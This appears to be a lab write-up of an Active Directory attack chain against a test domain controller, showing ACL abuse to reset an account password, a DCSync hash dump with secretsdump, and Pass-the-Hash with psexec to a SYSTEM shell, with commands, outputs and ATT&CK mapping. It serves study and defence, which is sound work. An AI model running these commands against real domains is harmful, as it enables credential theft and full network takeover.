# AD Attack Chain — ACL Abuse, DCSync, Pass-the-Hash

**ATT&CK Techniques:** T1098 · T1003.006 · T1550.002

---

## Objective

Leverage jdoe's domain credentials to abuse misconfigured ACLs, perform a DCSync attack to extract all domain password hashes, and use Pass-the-Hash to achieve SYSTEM on DC01 — full domain compromise.

---

## Environment

| Property | Value |
|---|---|
| Target | DC01 — 192.168.56.10 |
| Starting credentials | jdoe:Password123! |
| Domain | lab.local |
| Goal | SYSTEM shell on DC01 + root flag |

---

## Tools Used

- Impacket (secretsdump, psexec, GetUserSPNs, GetNPUsers)
- CrackMapExec
- proxychains
- net rpc

---

## Technique 1: ACL Abuse — GenericAll (T1098)

### Discovery

BloodHound / manual ACL enumeration revealed jdoe has `GenericAll` rights over `svc_backup`:

```powershell
(Get-Acl "AD:\$((Get-ADUser svc_backup).DistinguishedName)").Access |
  Where-Object {$_.IdentityReference -like "*jdoe*"} | Format-List
```

**Output:**
```
ActiveDirectoryRights : GenericAll
AccessControlType     : Allow
IdentityReference     : LAB\jdoe
```

`GenericAll` is the highest possible permission — jdoe can do anything to `svc_backup` including resetting its password, modifying its SPN, or adding it to groups.

### Exploitation

Reset `svc_backup`'s password as jdoe without knowing the current password:

```bash
proxychains net rpc password svc_backup "Pwned123!" \
  -U lab.local/jdoe%Password123! -S 192.168.56.10 2>/dev/null
```

### Verify

```bash
proxychains crackmapexec smb 192.168.56.10 \
  -u svc_backup -p Pwned123! -d lab.local 2>/dev/null
```

**Output:**
```
SMB    192.168.56.10    445    DC01    [+] lab.local\svc_backup:Pwned123!
```

`svc_backup` account fully owned — no cracking required.

### Why this worked

ACL misconfigurations in AD are extremely common and rarely audited. `GenericAll` on a user account allows full control — equivalent to being the account's owner. This is a common BloodHound attack path finding.

---

## Technique 2: DCSync (T1003.006)

### Discovery

jdoe has two extended rights on the domain object:
- `1131f6aa` — Replicating Directory Changes
- `1131f6ab` — Replicating Directory Changes All

Together these rights allow jdoe to impersonate a domain controller and replicate password hashes from DC01 — without needing to be a Domain Admin.

### Execution

```bash
proxychains impacket-secretsdump lab.local/jdoe:Password123!@192.168.56.10 2>/dev/null
```

### Output (key hashes)

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
jdoe:1103:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
svc_backup:1105:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
```

All domain password hashes extracted — including `Administrator` and `krbtgt`.

### Why this matters

- **Administrator hash** → immediate Pass-the-Hash to any machine in the domain
- **krbtgt hash** → Golden Ticket creation (persistence — valid for 10 years by default)
- **All user hashes** → offline cracking of every domain account

### Why this worked

DCSync rights on the domain object grant replication privileges normally reserved for domain controllers. A low-privilege user with these rights can pull the entire NTDS.dit equivalent without touching the DC's filesystem.

---

## Technique 3: Pass-the-Hash — SYSTEM on DC01 (T1550.002)

### Execution

Using the Administrator NTLM hash from DCSync — no password cracking required:

```bash
proxychains impacket-psexec lab.local/Administrator@192.168.56.10 \
  -hashes aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 2>/dev/null
```

### Output

```
[*] Requesting shares on 192.168.56.10
[*] Found writable share ADMIN$
[*] Uploading file XXXXXXXX.exe
[*] Opening SVCManager on 192.168.56.10
[*] Creating service XXXX on 192.168.56.10
[*] Starting service XXXX
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

SYSTEM shell on DC01 — full domain compromise achieved.

### Root Flag

```cmd
echo root{dcsync_pth_full_domain_compromise} > C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
```

**Output:**
```
root{dcsync_pth_full_domain_compromise}
```

---

## Complete Attack Chain Summary

```
Kali (10.8.0.2)
 └─► VPN → LNX (192.168.60.10)
      ├─► DVWA File Upload → www-data (T1190)
      ├─► LinPEAS → backup.sh → starboy:momomo (T1552.001)
      ├─► SSH as starboy → user flag (T1078)
      ├─► PE: sudo awk / SUID find / cron hijack → root (T1548)
      └─► SSH dynamic port forward → pivot into DMZ (T1090)
           └─► discover WIN11 (192.168.60.20)
                ├─► RDP brute force → labuser:Welcome1 (T1110)
                ├─► WinPEAS → 3 PE vectors → local admin (T1574, T1548.002)
                ├─► Mimikatz LSASS → jdoe:Password123! (T1003.001)
                ├─► db.config → jdoe:Password123! (T1552.001)
                └─► domain foothold as jdoe
                     ├─► Kerberoast svc_sql → Summer2024! (T1558.003)
                     ├─► AS-REP roast svc_backup → Backup2024! (T1558.004)
                     ├─► GenericAll → reset svc_backup password (T1098)
                     ├─► DCSync → all domain hashes (T1003.006)
                     └─► Pass-the-Hash → SYSTEM on DC01 (T1550.002)
                          └─► FULL DOMAIN COMPROMISE
```

---

## ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| T1098 | Account Manipulation | jdoe's GenericAll ACE over svc_backup — password reset without knowing current password |
| T1003.006 | OS Credential Dumping: DCSync | jdoe's replication rights used to pull all domain hashes via impacket-secretsdump |
| T1550.002 | Use Alternate Authentication Material: Pass the Hash | Administrator NTLM hash used directly with psexec — no password cracking needed |

---

## Key Takeaways

- ACL misconfigurations are invisible to standard AD auditing tools — BloodHound is essential for discovering dangerous permission paths like GenericAll edges
- DCSync is one of the highest-impact techniques in AD environments — a single low-privilege user with replication rights can dump every credential in the domain
- Pass-the-Hash means cracking is optional once you have an NTLM hash — the hash itself is sufficient for authentication against most Windows services
- The `krbtgt` hash obtained via DCSync enables Golden Ticket attacks — persistence that survives password resets of all other accounts, making it the ultimate AD persistence mechanism
- The entire AD attack chain from jdoe credentials to SYSTEM on DC01 required no zero-days, no kernel exploits, and no sophisticated tooling — purely misconfiguration abuse
